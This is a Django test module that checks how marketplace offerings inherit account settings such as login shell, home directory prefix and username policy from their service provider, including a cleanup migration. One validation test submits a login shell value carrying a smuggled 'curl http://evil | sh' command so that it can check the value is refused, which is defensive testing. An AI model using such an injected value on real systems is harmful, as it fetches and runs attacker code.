"""Offerings inherit account settings from their service provider.

The offering's own plugin option wins, else the provider's account option of
the same name, else the built-in default. Saving an offering through the API
must not write the defaults into its plugin options, or the provider value is
never reached.
"""

from importlib import import_module

from django.apps import apps as django_apps
from django.db import connection
from django.test.utils import CaptureQueriesContext
from django.urls import reverse
from rest_framework import status, test

from waldur_core.permissions.enums import PermissionEnum
from waldur_core.permissions.fixtures import CustomerRole
from waldur_core.structure.tests import factories as structure_factories
from waldur_mastermind.marketplace import models, serializers, utils
from waldur_mastermind.marketplace.enums import (
    BASIC_OFFERING,
    RANCHER_OFFERING,
    AccountScopes,
    OfferingStates,
    OfferingUserStates,
)
from waldur_mastermind.marketplace.tests import factories
from waldur_mastermind.marketplace.tests import fixtures as marketplace_fixtures

POLICY = utils.UsernameGenerationPolicy
PACKAGE = "waldur_mastermind.marketplace.migrations"
clear_stamped = import_module(
    f"{PACKAGE}.0293_service_provider_account_options"
).clear_stamped_account_settings


def value_and_source(setting):
    return {"value": setting["value"], "source": setting["source"]}


class AccountOptionsDeclarationTest(test.APITestCase):
    def test_the_serializer_declares_exactly_the_resolved_settings(self):
        """One list of settings: what the offering resolves is what both the
        offering and the provider may set."""
        self.assertEqual(
            set(serializers.AccountOptionsSerializer().fields),
            set(models.Offering.ACCOUNT_SETTING_DEFAULTS),
        )


class ProviderAccountSettingsInheritanceTest(test.APITestCase):
    def setUp(self):
        self.fixture = marketplace_fixtures.MarketplaceFixture()
        self.provider = self.fixture.service_provider
        self.provider.account_options = {
            "username_generation_policy": POLICY.ANONYMIZED.value,
            "username_anonymized_prefix": "acme_",
            "homedir_prefix": "/srv/home/",
            "login_shell": "/bin/zsh",
        }
        self.provider.save()
        self.offering = self.fixture.offering
        CustomerRole.OWNER.add_permission(PermissionEnum.UPDATE_OFFERING_INTEGRATION)
        self.client.force_authenticate(self.fixture.staff)

    def _update(self, plugin_options):
        url = factories.OfferingFactory.get_url(self.offering, "update_integration")
        response = self.client.post(url, {"plugin_options": plugin_options})
        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.offering.refresh_from_db()

    def test_saving_without_the_keys_leaves_the_provider_in_charge(self):
        self._update({"uid_source": "pool"})

        for key in (
            "username_generation_policy",
            "username_anonymized_prefix",
            "homedir_prefix",
            "login_shell",
        ):
            self.assertNotIn(key, self.offering.plugin_options)
        self.assertEqual(
            self.offering.resolve_account_setting("username_generation_policy"),
            POLICY.ANONYMIZED.value,
        )
        self.assertEqual(
            self.offering.resolve_account_setting("homedir_prefix"), "/srv/home/"
        )
        self.assertEqual(
            self.offering.resolve_account_setting("login_shell"), "/bin/zsh"
        )

    def test_an_explicit_offering_value_still_wins(self):
        self._update({"login_shell": "/bin/sh"})

        self.assertEqual(self.offering.plugin_options["login_shell"], "/bin/sh")
        self.assertEqual(
            self.offering.resolve_account_setting("login_shell"), "/bin/sh"
        )

    def test_a_blank_value_removes_the_override(self):
        self._update(
            {
                "login_shell": "/bin/sh",
                "homedir_prefix": "/data/",
                "username_generation_policy": POLICY.FULL_NAME.value,
                "account_scope": "offering",
            }
        )

        self._update(
            {
                "login_shell": "",
                "homedir_prefix": "",
                "username_generation_policy": "",
                "account_scope": "",
            }
        )

        for key in (
            "login_shell",
            "homedir_prefix",
            "username_generation_policy",
            "account_scope",
        ):
            self.assertNotIn(key, self.offering.plugin_options)
        self.assertEqual(
            value_and_source(self.offering.account_settings["login_shell"]),
            {"value": "/bin/zsh", "source": "provider"},
        )
        self.assertEqual(
            value_and_source(
                self.offering.account_settings["username_generation_policy"]
            ),
            {"value": POLICY.ANONYMIZED.value, "source": "provider"},
        )

    def test_account_settings_report_value_source_and_inherited_value(self):
        del self.provider.account_options["homedir_prefix"]
        self.provider.save()
        self._update({"login_shell": "/bin/sh"})

        response = self.client.get(factories.OfferingFactory.get_url(self.offering))

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        anonymized = {"value": POLICY.ANONYMIZED.value, "source": "provider"}
        prefix = {"value": "acme_", "source": "provider"}
        default_scope = {"value": "offering", "source": "default"}
        default_home = {"value": "/home/", "source": "default"}
        self.assertEqual(
            response.data["account_settings"],
            {
                "account_scope": {**default_scope, "inherited": default_scope},
                "username_generation_policy": {**anonymized, "inherited": anonymized},
                "username_anonymized_prefix": {**prefix, "inherited": prefix},
                "homedir_prefix": {**default_home, "inherited": default_home},
                # What removing the offering's own shell leads to.
                "login_shell": {
                    "value": "/bin/sh",
                    "source": "offering",
                    "inherited": {"value": "/bin/zsh", "source": "provider"},
                },
            },
        )

    def test_public_offering_reports_account_settings(self):
        self.offering.state = OfferingStates.ACTIVE
        self.offering.save()

        response = self.client.get(
            factories.OfferingFactory.get_public_url(self.offering)
        )

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(
            value_and_source(response.data["account_settings"]["login_shell"]),
            {"value": "/bin/zsh", "source": "provider"},
        )

    def test_resource_reports_its_offering_account_settings(self):
        resource = factories.ResourceFactory(offering=self.offering)

        response = self.client.get(
            factories.ResourceFactory.get_provider_resource_url(resource)
        )

        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertEqual(
            value_and_source(
                response.data["offering_account_settings"]["username_generation_policy"]
            ),
            {"value": POLICY.ANONYMIZED.value, "source": "provider"},
        )


class ProviderAccountOptionsApiTest(test.APITestCase):
    """The provider writes its account options through the offering's serializer."""

    def setUp(self):
        self.fixture = marketplace_fixtures.MarketplaceFixture()
        self.provider = self.fixture.service_provider
        self.client.force_authenticate(self.fixture.service_owner)

    def _patch(self, account_options):
        return self.client.patch(
            factories.ServiceProviderFactory.get_url(self.provider),
            {"account_options": account_options},
        )

    def test_options_are_updated_key_by_key(self):
        self._patch({"login_shell": "/bin/zsh"})
        response = self._patch({"homedir_prefix": "/srv/home/"})

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.provider.refresh_from_db()
        self.assertEqual(
            self.provider.account_options,
            {"login_shell": "/bin/zsh", "homedir_prefix": "/srv/home/"},
        )

    def test_a_blank_value_removes_the_setting(self):
        self._patch({"login_shell": "/bin/zsh", "homedir_prefix": "/srv/home/"})
        self._patch({"login_shell": ""})

        self.provider.refresh_from_db()
        self.assertEqual(
            self.provider.account_options, {"homedir_prefix": "/srv/home/"}
        )

    def test_only_the_settings_it_sets_are_reported(self):
        self._patch({"login_shell": "/bin/zsh"})

        response = self.client.get(
            factories.ServiceProviderFactory.get_url(self.provider)
        )

        self.assertEqual(response.data["account_options"], {"login_shell": "/bin/zsh"})

    def test_an_unsafe_path_is_refused(self):
        response = self._patch({"login_shell": "/bin/bash; curl http://evil | sh"})

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn("login_shell", response.data["account_options"])
        self.provider.refresh_from_db()
        self.assertEqual(self.provider.account_options, {})

    def test_an_unknown_policy_is_refused(self):
        response = self._patch({"username_generation_policy": "whatever"})

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn("username_generation_policy", response.data["account_options"])

    def test_offerings_inherit_what_the_provider_sets(self):
        self._patch({"login_shell": "/bin/zsh"})

        # Fetched afresh: the fixture's offering holds the provider as it was.
        offering = models.Offering.objects.get(pk=self.fixture.offering.pk)
        self.assertEqual(
            offering.resolve_account_setting_with_source("login_shell"),
            ("/bin/zsh", "provider"),
        )


class UsernameRegenerationOnSettingsChangeTest(test.APITestCase):
    def setUp(self):
        self.provider = factories.ServiceProviderFactory()

    def _offering_user(self, plugin_options=None, username="old_username"):
        offering = factories.OfferingFactory(
            type=BASIC_OFFERING,
            customer=self.provider.customer,
            plugin_options=plugin_options or {},
        )
        return factories.OfferingUserFactory(offering=offering, username=username)

    def _set_provider_option(self, name, value):
        self.provider.account_options = {**self.provider.account_options, name: value}
        self.provider.save()

    def _set_provider_policy(self, policy):
        self._set_provider_option("username_generation_policy", policy)

    def test_provider_policy_change_regenerates_inheriting_offering(self):
        offering_user = self._offering_user()

        self._set_provider_policy(POLICY.WALDUR_USERNAME.value)

        offering_user.refresh_from_db()
        self.assertEqual(offering_user.username, offering_user.user.username)

    def test_provider_policy_change_leaves_overriding_offering_alone(self):
        offering_user = self._offering_user(
            {"username_generation_policy": POLICY.FULL_NAME.value}
        )

        self._set_provider_policy(POLICY.WALDUR_USERNAME.value)

        offering_user.refresh_from_db()
        self.assertEqual(offering_user.username, "old_username")

    def test_unrelated_provider_change_does_not_regenerate(self):
        offering_user = self._offering_user()

        self._set_provider_option("login_shell", "/bin/zsh")

        offering_user.refresh_from_db()
        self.assertEqual(offering_user.username, "old_username")

    def test_dropping_a_stamped_policy_lets_the_provider_policy_apply(self):
        offering_user = self._offering_user(
            {"username_generation_policy": POLICY.SERVICE_PROVIDER.value}
        )
        self._set_provider_policy(POLICY.WALDUR_USERNAME.value)
        offering_user.refresh_from_db()
        self.assertEqual(offering_user.username, "old_username")

        offering = offering_user.offering
        del offering.plugin_options["username_generation_policy"]
        offering.save()

        offering_user.refresh_from_db()
        self.assertEqual(offering_user.username, offering_user.user.username)

    def test_dropping_a_value_the_provider_shares_is_not_a_change(self):
        self._set_provider_policy(POLICY.WALDUR_USERNAME.value)
        offering_user = self._offering_user(
            {"username_generation_policy": POLICY.WALDUR_USERNAME.value},
            username="preserved_username",
        )

        offering = offering_user.offering
        del offering.plugin_options["username_generation_policy"]
        offering.save()

        offering_user.refresh_from_db()
        self.assertEqual(offering_user.username, "preserved_username")


class OfferingAccountScopeSwitchTest(test.APITestCase):
    """One offering moving into the provider's shared accounts.

    It joins only the offerings that already share accounts, so only their
    usernames can conflict with its own, and only its accounts and theirs are
    adopted.
    """

    def setUp(self):
        self.fixture = marketplace_fixtures.MarketplaceFixture()
        self.provider = self.fixture.service_provider
        self.offering = self.fixture.offering
        self.sharing = factories.OfferingFactory(
            customer=self.provider.customer,
            plugin_options={"account_scope": AccountScopes.PROVIDER},
        )
        self.person = structure_factories.UserFactory()
        self.client.force_authenticate(self.fixture.staff)

    def _account(self, offering, username):
        return models.OfferingUser.objects.create(
            offering=offering,
            user=self.person,
            username=username,
            state=OfferingUserStates.OK,
        )

    def _join(self):
        url = factories.OfferingFactory.get_url(self.offering, "update_integration")
        return self.client.post(
            url, {"plugin_options": {"account_scope": AccountScopes.PROVIDER}}
        )

    def test_joining_is_refused_while_usernames_disagree(self):
        self._account(self.offering, "jsmith")
        self._account(self.sharing, "j.smith")

        response = self._join()

        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn("account_scope", response.data["plugin_options"])
        self.offering.refresh_from_db()
        self.assertNotIn("account_scope", self.offering.plugin_options)
        self.assertFalse(models.ServiceProviderAccount.objects.exists())

    def test_joining_backs_the_offerings_existing_accounts(self):
        own = self._account(self.offering, "jsmith")
        theirs = self._account(self.sharing, "jsmith")

        response = self._join()

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        account = models.ServiceProviderAccount.objects.get(
            service_provider=self.provider, user=self.person
        )
        for offering_user in (own, theirs):
            offering_user.refresh_from_db()
            self.assertEqual(offering_user.service_provider_account, account)

    def test_offerings_keeping_their_own_accounts_are_left_out(self):
        separate = factories.OfferingFactory(
            customer=self.provider.customer,
            plugin_options={"account_scope": AccountScopes.OFFERING},
        )
        own = self._account(self.offering, "jsmith")
        elsewhere = self._account(separate, "someone.else")

        response = self._join()

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        own.refresh_from_db()
        elsewhere.refresh_from_db()
        self.assertIsNotNone(own.service_provider_account)
        self.assertIsNone(elsewhere.service_provider_account)

    def test_an_offering_already_sharing_accounts_is_not_checked_again(self):
        self.offering.plugin_options = {"account_scope": AccountScopes.PROVIDER}
        self.offering.save()
        self._account(self.offering, "jsmith")
        self._account(self.sharing, "j.smith")

        response = self._join()

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)


class ClearStampedAccountSettingsMigrationTest(test.APITestCase):
    """0293 removes serializer defaults that were stored on offerings."""

    STAMPED = {
        "username_generation_policy": "service_provider",
        "username_anonymized_prefix": "waldur_",
        "homedir_prefix": "/home/",
        "login_shell": "/bin/bash",
    }

    def _offering(self, provider_options, plugin_options):
        provider = factories.ServiceProviderFactory(account_options=provider_options)
        return factories.OfferingFactory(
            type=BASIC_OFFERING,
            customer=provider.customer,
            plugin_options=plugin_options,
        )

    def _migrate(self):
        clear_stamped(django_apps, None)

    def test_only_defaults_the_provider_replaces_are_removed(self):
        offering = self._offering(
            {"homedir_prefix": "/srv/home/"}, {**self.STAMPED, "enforce_qos": True}
        )

        self._migrate()

        # The provider sets only the home directory prefix, so only that key
        # goes; the others would just swap one built-in default for another.
        kept = {k: v for k, v in self.STAMPED.items() if k != "homedir_prefix"}
        offering.refresh_from_db()
        self.assertEqual(offering.plugin_options, {**kept, "enforce_qos": True})
        self.assertEqual(
            offering.resolve_account_setting("homedir_prefix"), "/srv/home/"
        )

    def test_a_chosen_value_is_kept(self):
        offering = self._offering(
            {"login_shell": "/bin/zsh"}, {"login_shell": "/bin/sh"}
        )

        self._migrate()

        offering.refresh_from_db()
        self.assertEqual(offering.plugin_options, {"login_shell": "/bin/sh"})

    def test_a_provider_setting_nothing_leaves_its_offerings_alone(self):
        offering = self._offering({}, dict(self.STAMPED))

        self._migrate()

        offering.refresh_from_db()
        self.assertEqual(offering.plugin_options, self.STAMPED)

    def test_a_username_setting_that_would_rename_accounts_is_kept(self):
        offering = self._offering(
            {"username_generation_policy": POLICY.WALDUR_USERNAME.value},
            {"username_generation_policy": "service_provider"},
        )
        offering_user = factories.OfferingUserFactory(
            offering=offering, username="old_username"
        )

        with self.assertLogs(
            f"{PACKAGE}.0293_service_provider_account_options", "WARNING"
        ) as logs:
            self._migrate()

        offering.refresh_from_db()
        self.assertEqual(
            offering.plugin_options, {"username_generation_policy": "service_provider"}
        )
        self.assertIn(offering.uuid.hex, logs.output[0])
        offering_user.refresh_from_db()
        self.assertEqual(offering_user.username, "old_username")

    def test_a_prefix_outside_the_anonymized_policy_is_removed(self):
        """The prefix is not part of a service_provider name, so dropping it
        renames nobody."""
        offering = self._offering(
            {"username_anonymized_prefix": "acme_"},
            {
                "username_generation_policy": "service_provider",
                "username_anonymized_prefix": "waldur_",
            },
        )

        self._migrate()

        offering.refresh_from_db()
        self.assertEqual(
            offering.plugin_options, {"username_generation_policy": "service_provider"}
        )

    def test_an_old_fallback_prefix_is_not_a_stamped_default(self):
        offering = self._offering(
            {"username_anonymized_prefix": "acme_"},
            {"username_anonymized_prefix": "walduruser_"},
        )

        self._migrate()

        offering.refresh_from_db()
        self.assertEqual(
            offering.plugin_options, {"username_anonymized_prefix": "walduruser_"}
        )

    def test_a_second_run_changes_nothing(self):
        offering = self._offering({"login_shell": "/bin/zsh"}, dict(self.STAMPED))
        self._migrate()
        offering.refresh_from_db()
        after_first = dict(offering.plugin_options)

        self._migrate()

        offering.refresh_from_db()
        self.assertEqual(offering.plugin_options, after_first)


class AccountSettingsQueryCountTest(test.APITestCase):
    """account_settings reads the provider, which must be joined, not fetched per row."""

    def setUp(self):
        self.fixture = marketplace_fixtures.MarketplaceFixture()
        self.client.force_authenticate(self.fixture.staff)

    def _offering(self):
        provider = factories.ServiceProviderFactory(
            account_options={"login_shell": "/bin/zsh"}
        )
        return factories.OfferingFactory(
            customer=provider.customer, state=OfferingStates.ACTIVE
        )

    def _count(self, url, field):
        query = {"field": ["uuid", field]}
        with CaptureQueriesContext(connection) as ctx:
            response = self.client.get(url, query)
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        return len(ctx), response

    def _assert_flat(self, url, field, add_row):
        add_row()
        self.client.get(url, {"field": ["uuid", field]})  # warm one-off lookups
        one, _ = self._count(url, field)
        for _ in range(3):
            add_row()
        many, response = self._count(url, field)
        self.assertTrue(all(field in row for row in response.data))
        self.assertEqual(one, many)

    def test_provider_offering_list(self):
        self._assert_flat(
            factories.OfferingFactory.get_list_url(), "account_settings", self._offering
        )

    def test_public_offering_list(self):
        self._assert_flat(
            factories.OfferingFactory.get_public_list_url(),
            "account_settings",
            self._offering,
        )

    def test_provider_resource_list(self):
        self._assert_flat(
            factories.ResourceFactory.get_provider_resource_list_url(),
            "offering_account_settings",
            lambda: factories.ResourceFactory(offering=self._offering()),
        )

    def test_managed_rancher_resource_list(self):
        def add_row():
            offering = self._offering()
            offering.type = RANCHER_OFFERING
            offering.save()
            factories.ResourceFactory(offering=offering)

        self._assert_flat(
            reverse("managed-rancher-cluster-resource-list"),
            "offering_account_settings",
            add_row,
        )


class ResolveAccountSettingTest(test.APITestCase):
    def test_default_falls_back_to_the_built_in_value(self):
        offering = factories.OfferingFactory(plugin_options={})

        self.assertEqual(
            offering.resolve_account_setting("username_generation_policy"),
            POLICY.SERVICE_PROVIDER.value,
        )
        self.assertEqual(
            offering.resolve_account_setting_with_source("login_shell"),
            ("/bin/bash", "default"),
        )

    def test_explicit_default_is_kept(self):
        offering = factories.OfferingFactory(plugin_options={})

        self.assertEqual(
            offering.resolve_account_setting("homedir_prefix", "/data/"), "/data/"
        )

    def test_resolves_against_given_plugin_options(self):
        offering = factories.OfferingFactory(plugin_options={"login_shell": "/bin/sh"})

        self.assertEqual(
            offering.resolve_account_setting_with_source(
                "login_shell", plugin_options={}
            ),
            ("/bin/bash", "default"),
        )

    def test_inherited_value_ignores_the_offerings_own(self):
        provider = factories.ServiceProviderFactory(
            account_options={"login_shell": "/bin/zsh"}
        )
        offering = factories.OfferingFactory(
            customer=provider.customer, plugin_options={"login_shell": "/bin/sh"}
        )

        self.assertEqual(
            offering.resolve_inherited_account_setting("login_shell"),
            ("/bin/zsh", "provider"),
        )
        self.assertEqual(
            offering.resolve_inherited_account_setting("homedir_prefix"),
            ("/home/", "default"),
        )
